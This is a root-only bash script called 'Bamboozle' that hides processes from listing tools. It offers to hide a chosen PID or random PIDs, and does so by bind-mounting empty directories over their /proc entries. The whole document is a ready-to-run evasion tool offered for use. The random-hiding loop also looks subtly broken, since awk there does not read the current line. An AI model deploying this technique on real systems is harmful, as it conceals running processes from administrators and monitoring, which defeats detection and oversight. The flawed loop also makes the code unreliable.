#!/bin/bash

# Bamboozle (bambam)
# Logan Upchurch

# quit if not run as root
if [ "$EUID" -ne 0 ]; then
	echo "This script only works as root"
	exit -1
fi

# make test empty folder in /tmp
DIR="/tmp/bam"
mkdir -p $DIR

# if it can't, make test empty folder in /usr/bin
if [ $? -ne 0 ]; then
	DIR="/usr/bin/bam"
	mkdir -p $DIR
	
	# if it can't, quit
	if [ $? -ne 0 ]; then
		echo "Script failed"
		exit -2
	fi
	
	rmdir $DIR 2> /dev/null
fi

# remove test folder
rmdir $DIR 2> /dev/null

while :
do
	# clear the terminal and print the menu
	clear
	printf "*********************\n"
	printf "***** BAMBOOZLE *****\n"
	printf "*********************\n\n"
	
	printf "The empty directory is: $DIR\n\n"
	
	printf "Enter selection:\n"
	printf "1) Hide a specific process\n"
	printf "2) Hide random processes\n"
	printf "q to quit\n\n"
	
	if [ "$opt" = "no" ]; then
		printf "Invalid option\n"
	else
		printf "\n"
	fi

	# get input
	printf "#?"
	read opt

	case $opt in
		# hide a specific process
		1)
			while :
			do
				# prompt for process PID
				clear
				printf "Enter the PID of the process you want to hide (q to menu)\n"
				printf "(If you're unsure, do ps -ef)\n"
				read pid
				
				# return to menu
				if [ "$pid" == "q" ] || [ "$pid" == "Q" ]; then
					break
				fi
				
				# make an empty directory and mount the process PID dir to that directory
				mkdir -p ${DIR}${pid}
				mount -o bind ${DIR}${pid} /proc/$pid
				
				# failure, loop back to prompt
				if [ $? -ne 0 ]; then
					printf "Mount failed. Press any key to try again\n"
					read -n 1 -s
				# success
				else
					printf "Success. Press any key to return to menu\n"
					read -n 1 -s
					break
				fi
			done
			opt="yes"
			;;
		# hide random processes
		2)
			clear
			printf "Hiding random processes...\n"
			
			ps -ef | while read line
			do
				pid=$(awk '{print $2}')
				if [ "$pid" != "PID" ]; then
					if [ $RANDOM -gt 16383 ]; then
						mkdir -p ${DIR}${pid}
						mount -o bind ${DIR}${pid} /proc/$pid
						
						# failure
						if [ $? -ne 0 ]; then
							printf "Mount failed for /proc/$pid\n"
						# success
						else
							printf "Process $pid hidden\n"
						fi
					fi
				fi
			done
			
			printf "Done. Press any key to return to menu\n"
			read -n 1 -s
			opt="yes"
			;;
		# quit
		q | Q)
			break
			;;
		# invalid option
		*)
			opt="no"
			;;
	esac
done

clear
	

